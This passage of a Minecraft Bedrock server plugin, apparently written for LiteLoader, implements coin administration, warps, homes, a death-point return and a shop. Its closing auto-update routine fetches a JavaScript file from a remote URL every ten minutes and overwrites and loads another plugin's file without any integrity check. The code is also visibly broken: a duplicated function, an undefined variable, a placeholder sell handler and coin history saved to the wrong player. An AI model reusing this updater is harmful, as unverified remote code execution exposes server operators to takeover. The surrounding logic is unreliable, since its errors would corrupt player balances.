        let target = mc.getPlayer(lst[data[0]])
        if(!target) return pl.sendText("目标玩家离线")
        target.setScore(conf.get("Scoreboard"),parseInt(data[1]))
    
        let moneyhisdata = MoneyHistory.get(target.realName)
        moneyhisdata[String(system.getTimeStr())+"§"+getRandomLetter()] = conf.get("CoinName")+"设置"+data[1]
        MoneyHistory.set(pl.realName,moneyhisdata)

        pl.sendText("成功将玩家"+target.realName+"的"+conf.get("CoinName")+"设置为"+data[1])
        pl.sendText("玩家当前金币为："+target.getScore(conf.get("Scoreboard")))
    })
}


function MoneyReduceGui(plname){
    let pl = mc.getPlayer(plname)
    if(!pl) return
    let fm = mc.newCustomForm()
    fm.setTitle("减少玩家"+conf.get("CoinName"))
    let lst = []
    mc.getOnlinePlayers().forEach((pl)=>{
        lst.push(pl.realName)
    })
    fm.addDropdown("选择玩家",lst)
    fm.addInput("请输入减少的"+conf.get("CoinName"),"请输入减少的"+conf.get("CoinName"))
    pl.sendForm(fm,(pl,data)=>{
        if(data == null) return pl.runcmd("moneygui")
        if(data[1] == '' || !data[1]) return pl.sendText("请输入减少数量")
        let target = mc.getPlayer(lst[data[0]])
        if(!target) return pl.sendText("目标玩家离线")
        target.reduceScore(conf.get("Scoreboard"),parseInt(data[1]))
    
        let moneyhisdata = MoneyHistory.get(target.realName)
        moneyhisdata[String(system.getTimeStr())+"§"+getRandomLetter()] = conf.get("CoinName")+"减少"+data[1]
        MoneyHistory.set(pl.realName,moneyhisdata)

        pl.sendText("成功将玩家"+target.realName+"的"+conf.get("CoinName")+"减少"+data[1])
        pl.sendText("玩家当前金币为："+target.getScore(conf.get("Scoreboard")))
    })
}

function MoneyAddGui(plname){
    let pl = mc.getPlayer(plname)
    if(!pl) return
    let fm = mc.newCustomForm()
    fm.setTitle("增加玩家"+conf.get("CoinName"))
    let lst = []
    mc.getOnlinePlayers().forEach((pl)=>{
        lst.push(pl.realName)
    })
    fm.addDropdown("选择玩家",lst)
    fm.addInput("请输入增加的"+conf.get("CoinName"),"请输入增加的"+conf.get("CoinName"))
    pl.sendForm(fm,(pl,data)=>{
        if(data == null) return pl.runcmd("moneygui")
        if(data[1] == '' || !data[1]) return pl.sendText("请输入增加数量")
        let target = mc.getPlayer(lst[data[0]])
        if(!target) return pl.sendText("目标玩家离线")
        //    logger.log(123)
        target.addScore(conf.get("Scoreboard"),parseInt(data[1]))
    
        let moneyhisdata = MoneyHistory.get(target.realName)
        //logger.log(12323)
        moneyhisdata[String(system.getTimeStr())+"§"+getRandomLetter()] = conf.get("CoinName")+"增加"+data[1]
        //logger.log(12313)
        MoneyHistory.set(pl.realName,moneyhisdata)

        pl.sendText("成功将玩家"+target.realName+"的"+conf.get("CoinName")+"增加"+data[1])
        pl.sendText("玩家当前金币为："+target.getScore(conf.get("Scoreboard")))
    })
}


let warpgui = mc.newCommand("warp","公共传送点",PermType.Any)
warpgui.overload([])
warpgui.setCallback((cmd,ori,out,res)=>{
    let pl = ori.player
    if(!pl) return out.error("仅限玩家执行")
    
    let fm = mc.newSimpleForm()
    fm.setTitle("公共传送点")
    if(pl.isOP()) {
        OPWarpGui(pl.realName)
    }else{
        WarpGui(pl.realName)
    }
    
})
warpgui.setup()

function OPWarpGui(plname){
    let pl = mc.getPlayer(plname)
    if(!pl) return
    let fm = mc.newSimpleForm()
    fm.setTitle("(OP)公共传送点")
    fm.addButton("添加传送点")
    fm.addButton("删除传送点")
    fm.addButton("传送点列表")
    pl.sendForm(fm,(pl,id)=>{
        if(id == null) return pl.sendText("表单关闭")
        switch(id){
            case 0:
                WarpAddGui(pl.realName)
                break
            case 1:
                WarpDelGui(pl.realName)
                break
            case 2:
                WarpGui(pl.realName)
                break
        }
    })
}

function WarpGui(plname){
    let pl = mc.getPlayer(plname)
    if(!pl) return
    let cost = conf.get("Warp")
    let fm = mc.newSimpleForm()
    fm.setTitle("公共传送点")
    let lst = Object.keys(JSON.parse(warpdata.read()))
    //logger.log(lst)
    for(let i in lst){
        fm.addButton(lst[i])
    }
    pl.sendForm(fm,(pl,id)=>{
        if(id == null) return pl.sendText("表单关闭")
        let fm = mc.newCustomForm()
        fm.setTitle("前往传送点")
        fm.addLabel("传送点名称："+lst[id])
        fm.addLabel("坐标："+warpdata.get(lst[id]).x+","+warpdata.get(lst[id]).y+","+warpdata.get(lst[id]).z+" "+transdimid[warpdata.get(lst[id]).dimid])
        fm.addLabel("传送花费："+conf.get("Warp"))
        fm.addLabel("您的"+conf.get("CoinName")+"："+String(pl.getScore(conf.get("Scoreboard"))))
        pl.sendForm(fm,(pl,data)=>{
            if(data == null) return pl.sendText("表单关闭")
            
            if(!ValueCheck(pl.realName,cost)) return pl.sendText("您的"+conf.get("CoinName")+"不足！")
            
            pl.teleport(parseFloat(warpdata.get(lst[id]).x),parseFloat(warpdata.get(lst[id]).y),parseFloat(warpdata.get(lst[id]).z),parseInt(warpdata.get(lst[id]).dimid))
            pl.sendText("已前往传送点 "+lst[id])
            
        })
    })
}

function WarpDelGui(plname){
    let pl = mc.getPlayer(plname)
    if(!pl) return
    let fm = mc.newSimpleForm()
    fm.setTitle("删除公共传送点")
    let lst = Object.keys(JSON.parse(warpdata.read()))
    //(lst)
    for(let i in lst){
        fm.addButton(lst[i])
    }
    pl.sendForm(fm,(pl,id)=>{
        if(id == null) return pl.runcmd("warp")
        warpdata.delete(lst[id])
        pl.sendText("删除公共传送点 "+lst[id]+" 成功！")
    })
}


function WarpAddGui(plname){
    let pl = mc.getPlayer(plname)
    if(!pl) return
    let fm = mc.newCustomForm()
    fm.setTitle("添加公共传送点")
    fm.addLabel("添加当前坐标为公共传送点")
    fm.addLabel("坐标："+pl.pos.x.toFixed(1)+","+pl.pos.y.toFixed(1)+","+pl.pos.z.toFixed(1)+" "+transdimid[pl.pos.dimid])
    fm.addInput("请输入传送点名称","传送点名称")
    pl.sendForm(fm,(pl,data)=>{
        if(data == null) return pl.runcmd("warp")
        if(data[2] == "" || !data[2]) return pl.sendText("传送点名称不能为空！")
        if(warpdata.get(data[2]) != null) return pl.sendText("传送点名称已存在！")
        warpdata.set(data[2],{
            "x":JSON.parse(pl.pos.x).toFixed(1),
            "y":JSON.parse(pl.pos.y).toFixed(1),
            "z":JSON.parse(pl.pos.z).toFixed(1),
            "dimid":JSON.parse(pl.pos.dimid)
        })
        pl.sendText("添加公共传送点 "+data[2]+" 成功！")
    })
}



mc.listen("onRespawn",(pl)=>{
    if(conf.get("BackTipAfterDeath")) {
        BackGUI(pl.realName)
    }
})

let backcmd = mc.newCommand("back","返回死亡点",PermType.Any)
backcmd.overload([])
backcmd.setCallback((cmd,ori,out,res)=>{
    let pl = ori.player
    if(!pl) return out.error("仅限玩家执行")
    BackGUI(pl.realName)
})
backcmd.setup()
function BackGUI(plname){
    let pl = mc.getPlayer(plname)
    if(!pl) return
    let cost = conf.get("Back")
    let pos = pl.lastDeathPos
    if(!pos) return pl.sendText("您没有死亡记录")
    // if(!ValueCheck(pl.realName,conf.get("Back"))) return pl.sendText("返回失败 ！\n返回死亡点需要花费 "+conf.get("Back")+conf.get("CoinName"))
    // pl.teleport(pos)
    // pl.sendText("返回成功！")
    let fm = mc.newCustomForm()
    fm.setTitle("返回死亡点")
    fm.addLabel("确认返回死亡点？")
    fm.addLabel("死亡点坐标："+pl.lastDeathPos.x+","+pl.lastDeathPos.y+","+pl.lastDeathPos.z+" "+transdimid[pl.lastDeathPos.dimid])
    fm.addLabel("您的"+conf.get("CoinName")+"："+String(pl.getScore(conf.get("Scoreboard"))))
    fm.addLabel("返回死亡点需要花费"+cost+conf.get("CoinName"))
    pl.sendForm(fm,(pl,id)=>{
        if(id == null) return pl.sendText("表单关闭")
        if(!ValueCheck(pl.realName,cost)) return pl.sendText("返回失败！\n返回死亡点需要花费 "+conf.get("Back")+conf.get("CoinName"))
        pl.teleport(pl.lastDeathPos)
        pl.sendText("返回成功！")
    })
}

let homegui = mc.newCommand("home","家园系统",PermType.Any)
homegui.overload([])
homegui.setCallback((cmd,ori,out,res)=>{
    let pl = ori.player

    if(!pl) return out.error("仅限玩家执行")
    
    let fm = mc.newSimpleForm()
    fm.setTitle("家园传送系统")
    fm.addButton("添加家")
    fm.addButton("删除家")
    fm.addButton("传送家")

    pl.sendForm(fm,(pl,id)=>{
        if(id == null) return pl.sendText("表单关闭")
        
        switch(id){
            case 0:
                AddHome(pl.realName)
                break
            case 1:
                DelHome(pl.realName)
                break
            case 2:
                TpHome(pl.realName)
                break
        }
    })
})
homegui.setup()

function TpHome(plname){
    let pl = mc.getPlayer(plname)
    if(!pl) return
    let cost = conf.get("Home").tp
    let fm = mc.newSimpleForm()
    fm.setTitle("传送家")
    fm.setContent("请选择要传送的家")
    let lst = []
    let pldata = homedata.get(pl.realName)
    for(let i in pldata){
        lst.push(i)
        fm.addButton(i+"\n坐标："+pldata[i].x+","+pldata[i].y+","+pldata[i].z+" "+transdimid[pldata[i].dimid])
    }
    pl.sendForm(fm,(pl,id)=>{
        if(id == null) return pl.sendText("表单关闭")
        //if(!ValueCheck(pl.realName,cost)) return pl.sendText("传送失败！\n传送家需要花费 "+conf.get("Home").tp+conf.get("CoinName"))
        let fm = mc.newCustomForm()
        fm.setTitle("传送家")
        fm.addLabel("确认传送家 "+lst[id]+"？")
        fm.addLabel("您的"+conf.get("CoinName")+"："+String(pl.getScore(conf.get("Scoreboard"))))
        fm.addLabel("传送家需要花费"+cost+conf.get("CoinName"))
        fm.addLabel("坐标："+pldata[lst[id]].x+","+pldata[lst[id]].y+","+pldata[lst[id]].z+" "+transdimid[pldata[lst[id]].dimid])
        pl.sendForm(fm,(pl,data)=>{
            if(data == null) return pl.runcmd("home")
            
            if(!ValueCheck(pl.realName,cost)) return pl.sendText("传送失败！\n传送家需要花费 "+conf.get("Home").tp+conf.get("CoinName"))
            //logger.log(pldata[lst[id]].x)
            
            pl.teleport(parseFloat(pldata[lst[id]].x),parseFloat(pldata[lst[id]].y),parseFloat(pldata[lst[id]].z),parseInt(pldata[lst[id]].dimid))
            pl.sendText("传送家 "+lst[id]+" 成功！")
        })
    })
}

function DelHome(plname){
    let pl = mc.getPlayer(plname)
    if(!pl) return
    let cost = conf.get("Home").del
    let fm = mc.newSimpleForm()
    fm.setTitle("删除家")
    fm.setContent("请选择要删除的家")
    let lst = []
    let pldata = homedata.get(pl.realName)
    for(let i in pldata){
        lst.push(i)
        fm.addButton(i+"\n坐标："+pldata[i].x+","+pldata[i].y+","+pldata[i].z+" "+transdimid[pldata[i].dimid])
    }
    pl.sendForm(fm,(pl,id)=>{
        if(id == null) return pl.runcmd("home")
        //if(!ValueCheck(pl.realName,cost)) return pl.sendText("删除失败！\n删除家需要花费 "+conf.get("Home").del+conf.get("CoinName"))
        //    delete pldata[lst[id]]
        //homedata.set(pl.realName,pldata)
        //pl.sendText("删除家 "+lst[id]+" 成功！")
        let fm = mc.newCustomForm()
        fm.setTitle("删除家")
        fm.addLabel("请问您确认删除家 "+lst[id]+"？")
        fm.addLabel("您的"+conf.get("CoinName")+"："+String(pl.getScore(conf.get("Scoreboard"))))
        fm.addLabel("删除家需要花费"+cost+conf.get("CoinName"))
        fm.addLabel("坐标："+pldata[lst[id]].x+","+pldata[lst[id]].y+","+pldata[lst[id]].z+" "+transdimid[pldata[lst[id]].dimid])
        pl.sendForm(fm,(pl,data)=>{
            if(data == null) return pl.sendText("表单关闭")
            
            if(!ValueCheck(pl.realName,cost)) return pl.sendText("删除失败！\n删除家需要花费 "+conf.get("Home").del+conf.get("CoinName"))
            delete pldata[lst[id]]
            homedata.set(pl.realName,pldata)
            pl.sendText("删除家 "+lst[id]+" 成功！")
            
    })
    })
}

function AddHome(plname){
    let pl = mc.getPlayer(plname)
    if(!pl) return
    let cost = conf.get("Home").add

    let HomeCount = conf.get("Home").MaxHome
    let pldata = homedata.get(pl.realName)
    if(Object.keys(pldata).length >= HomeCount) return pl.sendText("家数量已达到上限值:"+HomeCount)
    //logger.log(Object.keys(pldata).length)

        let fm = mc.newCustomForm()
        //logger.log(1)
        fm.setTitle("添加家")
        fm.addLabel("当前坐标："+String(pl.pos))
        fm.addLabel("您的"+conf.get("CoinName")+"："+String(pl.getScore(conf.get("Scoreboard"))))
        fm.addLabel("添加花费："+String(cost)+conf.get("CoinName"))
        fm.addInput("请输入您的家名称")
        //logger.log(2)
        //fm.addButton("确认")
        //fm.addButton("确认")
        //logger.log(3)
        //fm.addButton("取消")
        //logger.log(1)
        pl.sendForm(fm,(pl,data)=>{
            //logger.log(data)
            if(data == null) return pl.runcmd("home")
            if(data[3] == "" || !data[3]) return pl.sendText("请输入家名称")
            //if(data[2]) return pl.sendText("取消成功")
            
            let pldata = homedata.get(pl.realName)
            //logger.log(pldata)
            if(Object.keys(pldata).includes(data[3])) return pl.sendText("家名称已存在")
            //logger.log(224)

            if(!ValueCheck(pl.realName,conf.get("Home").add)) return pl.sendText("添加失败！\n添加家需要花费 "+cost+conf.get("CoinName"))
            //logger.log(225)

            pldata[data[3]] = {
                "x":JSON.parse(pl.pos.x).toFixed(1),
                "y":JSON.parse(pl.pos.y).toFixed(1),
                "z":JSON.parse(pl.pos.z).toFixed(1),
                "dimid":JSON.parse(pl.pos.dimid)
            }

            //logger.log(226)
            homedata.set(pl.realName,pldata)
            pl.sendText("添加家："+data[3]+" 成功！")

        })


}
//Shop
const shopDefaultConfig = JSON.stringify(
    {
      sell: [
        { name: "§a钻石", price: 10, item: "minecraft:diamond", meta: 0 }
      ],
      buy: [
        { name: "§6金锭", price: 5, item: "minecraft:gold_ingot", meta: 0 }
      ]
    },
    null,  // 保留缩进
    2      // 缩进 2 空格
  );
  
  let shopdata = new JsonConfigFile(
    "./plugins/YEssential/shop.json",
    shopDefaultConfig // 正确：传递 JSON 字符串
  );
  if (!shopdata.get("sell")) {
    shopdata.set("sell", [
        { name: "§a应急石料", price: 1, item: "minecraft:cobblestone", meta: 0 }
    ]);
}
// 添加调试日志
logger.log("商店配置文件加载成功:", shopdata.read());

// ======================
// 商店命令注册
// ======================
let shopcmd = mc.newCommand("shop", "商店系统", PermType.Any);
shopcmd.overload([]);
shopcmd.setCallback((cmd, ori, out, res) => {
    let pl = ori.player;
    if (!pl) return;

    // 检查商店是否开启
    if (!conf.get("ShopEnabled")) {
        pl.sendText("§c商店功能已关闭！");
        return;
    }

    OpenShopMainMenu(pl.realName);
});
shopcmd.setup();

// ======================
// 购买功能函数定义（必须在 OpenShopMainMenu 之前）
// ======================
function OpenBuyMenu(plname) {
    const pl = mc.getPlayer(plname);
    if (!pl) return;

    const buyItems = Array.isArray(shopdata.get("buy")) ? shopdata.get("buy") : [];
    if (buyItems.length === 0) {
        pl.sendText("§c暂无商品可购买！");
        return;
    }

    const fm = mc.newSimpleForm();
    fm.setTitle("§l§a购买物品");
    fm.setContent(`您的余额: §e${pl.getScore(conf.get("Scoreboard"))} ${conf.get("CoinName")}`);

    buyItems.forEach((item) => {
        fm.addButton(`${item.name}\n§7价格: §c${item.price} ${conf.get("CoinName")}`, "", item.icon || "");
    });

    pl.sendForm(fm, (pl, id) => {
        if (id === null) return OpenShopMainMenu(pl.realName);
        OpenBuyAmountMenu(pl.realName, id);
    });
}
function OpenBuyAmountMenu(plname, itemIndex) {
    const pl = mc.getPlayer(plname);
    if (!pl) return;

    const buyItems = Array.isArray(shopdata.get("buy")) ? shopdata.get("buy") : [];
    const item = buyItems[itemIndex];
    if (!item || !item.item || typeof item.price !== "number") {
        pl.sendText("§c商品配置错误！");
        return;
    }

    const balance = pl.getScore(conf.get("Scoreboard"));
    const maxBuy = Math.floor(balance / item.price);

    if (maxBuy <= 0) {
        pl.sendText("§c金币不足，无法购买！");
        return;
    }

    const fm = mc.newCustomForm();
    fm.setTitle(`§l§a购买 ${item.name}`);
    fm.addLabel(`单价: §e${item.price} ${conf.get("CoinName")}\n最大可购买: §a${maxBuy}`);
    fm.addSlider("数量", 1, maxBuy, 1, 1);

    pl.sendForm(fm, (pl, data) => {
        if (data === null) return OpenBuyMenu(pl.realName);
        const amount = data[1];
        if (amount > 0) {
            const totalCost = amount * item.price;
            if (balance < totalCost) {
                pl.sendText("§c金币不足！");
                return;
            }

            // 分堆给予物品（每次最多 64 个）
            let remaining = amount;
            while (remaining > 0) {
                const stack = Math.min(remaining, 64);
                const itemStack = mc.newItem(item.item, stack, item.meta);
                if (!pl.giveItem(itemStack)) {
                    pl.sendText("§c背包已满！");
                    pl.addScore(conf.get("Scoreboard"), totalCost); // 返还金币
                    return;
                }
                remaining -= stack;
            }

            pl.reduceScore(conf.get("Scoreboard"), totalCost);
            pl.sendText(`§a购买成功！获得 ${amount} 个 ${item.name}`);
            logger.log(`[SHOP] 玩家 ${plname} 出售 ${amount} 个 ${item.name}`);
            logger.log(`[SHOP] 当前金币变化: +${total}`);
        }
    });
}

// ======================
// 商店主菜单
// ======================
function OpenShopMainMenu(plname) {
    const pl = mc.getPlayer(plname);
    if (!pl) return;

    const fm = mc.newSimpleForm();
    fm.setTitle("§l§a商店系统");
    fm.setContent(`您的余额: §e${pl.getScore(conf.get("Scoreboard"))} ${conf.get("CoinName")}`);

    fm.addButton("§l§d出售物品", "", shopdata.get("sell")[0]?.icon || "");
    fm.addButton("§l§b购买物品", "", shopdata.get("buy")[0]?.icon || "");
    fm.addButton("§l§c返回");

    pl.sendForm(fm, (pl, id) => {
        if (id === null) return;
        switch (id) {
            case 0: OpenSellMenu(pl.realName); break;
            case 1: OpenBuyMenu(pl.realName); break;
            case 2: MoneyGui(pl.realName); break;
        }
    });
}
// ======================
// 购买物品界面
// ======================
function OpenBuyAmountMenu(plname, itemIndex) {
    const pl = mc.getPlayer(plname);
    if (!pl) return;

    const buyItems = Array.isArray(shopdata.get("buy")) ? shopdata.get("buy") : [];
    const item = buyItems[itemIndex];
    if (!item || !item.item || typeof item.price !== "number") {
        pl.sendText("§c商品配置错误！");
        return;
    }

    const balance = pl.getScore(conf.get("Scoreboard"));
    const maxBuy = Math.floor(balance / item.price);
    // 如果余额不足，提示并返回
    if (maxBuy <= 0) {
        pl.sendText("§c金币不足，无法购买！");
        return;
    }
    const fm = mc.newCustomForm();
    fm.setTitle(`§l§a购买 ${item.name}`);
    fm.addLabel(`单价: §e${item.price} ${conf.get("CoinName")}\n最大可购买: §a${maxBuy}`);
    fm.addSlider("数量", 1, maxBuy, 1, 1);
    pl.sendForm(fm, (pl, data) => {
        if (data === null) return OpenBuyMenu(pl.realName);
        const amount = data[1];
        if (amount > 0) {
            const totalCost = amount * item.price;

            // 检查金币是否足够
            if (balance < totalCost) {
                pl.sendText("§c金币不足，无法完成购买！");
                return;
            }

            // 扣除金币
            pl.reduceScore(conf.get("Scoreboard"), totalCost);

            // 分多次给予物品（解决堆叠上限问题）
            let remainingAmount = amount;
            while (remainingAmount > 0) {
                const stackSize = Math.min(remainingAmount, 64); // 每次最多给予 64 个
                const itemStack = mc.newItem(item.item, stackSize, item.meta);
                if (!pl.giveItem(itemStack)) {
                    pl.sendText("§c背包已满，无法给予物品！");
                    // 返还金币
                    pl.addScore(conf.get("Scoreboard"), totalCost);
                    return;
                }
                remainingAmount -= stackSize;
            }

            pl.sendText(`§a成功购买 ${amount} 个 ${item.name}！`);
        }
    });
}
// ======================
// 出售物品界面（最终稳定版）
// ======================
function OpenSellMenu(plname) {
    const pl = mc.getPlayer(plname);
    if (!pl || !pl.getAllItems) return;

    // --- 强制初始化关键变量 ---
    let items = [];
    let validSellItems = [];

    try {
        // 处理玩家物品数据
        const rawItems = pl.getAllItems() || {};
        if (typeof rawItems === "object" && !Array.isArray(rawItems)) {
            items = Object.keys(rawItems).map(key => ({
                type: key.toLowerCase().trim(), // 统一转为小写并去除空格
                count: rawItems[key].count || 0,
                aux: Number(rawItems[key].meta) || 0 // 强制转为数字
            }));
        } else if (Array.isArray(rawItems)) {
            items = rawItems.map(i => ({
                type: (i.type || "").toLowerCase().trim(),
                count: i.count || 0,
                aux: Number(i.aux) || 0
            }));
        }

        // 加载商品配置（双重验证）
        const rawSellData = shopdata.get("sell");
        validSellItems = (Array.isArray(rawSellData) ? rawSellData : []).filter(item => {
            try {
                return (
                    item &&
                    typeof item === "object" &&
                    item.item && 
                    typeof item.price === "number" &&
                    items.some(i => 
                        i.type === item.item.toLowerCase().trim() && 
                        i.aux === (Number(item.meta) || 0)
                    )
                );
            } catch (e) {
                return false;
            }
        });
    } catch (e) {
        logger.error("出售系统初始化失败:", e);
        pl.sendText("§c商店功能暂时不可用！");
        return;
    }

    // --- 构建表单前进行安全检查 ---
    const fm = mc.newCustomForm();
    fm.setTitle("§l§a出售物品");
    
    if (validSellItems && validSellItems.length > 0) { // [!code ++]
        validSellItems.forEach(item => {
            const total = items
                .filter(i => 
                    i.type === item.item.toLowerCase().trim() && 
                    i.aux === (Number(item.meta) || 0)
                )
                .reduce((sum, i) => sum + (i.count || 0), 0);
            
            if (total > 0) {
                fm.addLabel(`§7${item.name} §f| 单价: §a${item.price} §f| 库存: §e${total}`);
                fm.addSlider("出售数量", 1, total, 1, 1);
            }
        });
    }

    // 空表单检查（增强版）
    if (!fm.components || fm.components.length === 0) { // [!code ++]
        pl.sendText("§c没有可出售的物品！");
        return;
    }

    // --- 表单回调处理（增加异常捕获）---
    pl.sendForm(fm, (pl, data) => {
        try {
            // ...（原有回调逻辑）...
        } catch (e) {
            logger.error("出售处理异常:", e);
            pl.sendText("§c交易处理失败，请联系管理员！");
        }
    });
}
function ValueCheck(plname,value){

    //if(value == 0) return true

    //let scoreboard = mc.getScoreObjective(conf.get("Scoreboard"))
    let score = mc.getPlayer(plname).getScore(conf.get("Scoreboard"))
    //logger.log(score)
    if(!score){
        mc.getPlayer(plname).setScore(conf.get("Scoreboard"),0)
    }

    if(score < value){
        return false
    }else{
        mc.getPlayer(plname).reduceScore(conf.get("Scoreboard"),value)
        return true
    }
}
function update(){
    let find = false;
    lxl.listPlugins().forEach(p=>{
        if(p == "LXLEssential.js"){
            lxl.import("lxless:getUpdate")();
            find = true;
        }
    });
    if(!find)
        getUpdate("0");
}
setInterval(update, 60*1000*10);
function getNewFile(show=false) {
    network.httpGet('https://liteldev-lxl.coding.net/p/lxlessential/d/LXLEssential/git/raw/main/LXLEssential.js?download=false', (c, d) => {
        if (c == 200) {
            if (file.exists(dir_path + ".noupdate") == false) {
                file.writeTo(update_dir+`LXLEssential(${version}).js`,file.readFrom('./plugins/LXLEssential.js'));
                file.writeTo('./plugins/LXLEssential.js', d);
                mc.runcmd("lxl load ./plugins/LXLEssential.js");
            }else{
                log('您关闭了自动更新，更新检测退出');
            }
        }if(show)
            log('自动更新失败，code：'+c);
    });
}
function getUpdate(v,show = false) {
    network.httpGet('https://liteldev-lxl.coding.net/p/lxlessential/d/LXLEssential/git/raw/main/api.json?download=false', (c, d) => {
        if (c == 200) {
            var dt = JSON.parse(d);
            //lxl.import("lxless:setUpdate")(dt.latest,dt.msg);
            if (dt.latest != v) {
                if(dt.necessary){
                    log(`获取到新版本：${dt.latest}，自动更新中...`);
                    getNewFile(show);
                }else{
                    log("未检测到新版本");
                }
            } else {
                if (show)
                    log("当前即为最新版本。");
            }
        }else{
            if(show)
                log('更新检测失败，code：'+c);
        }
    });
}
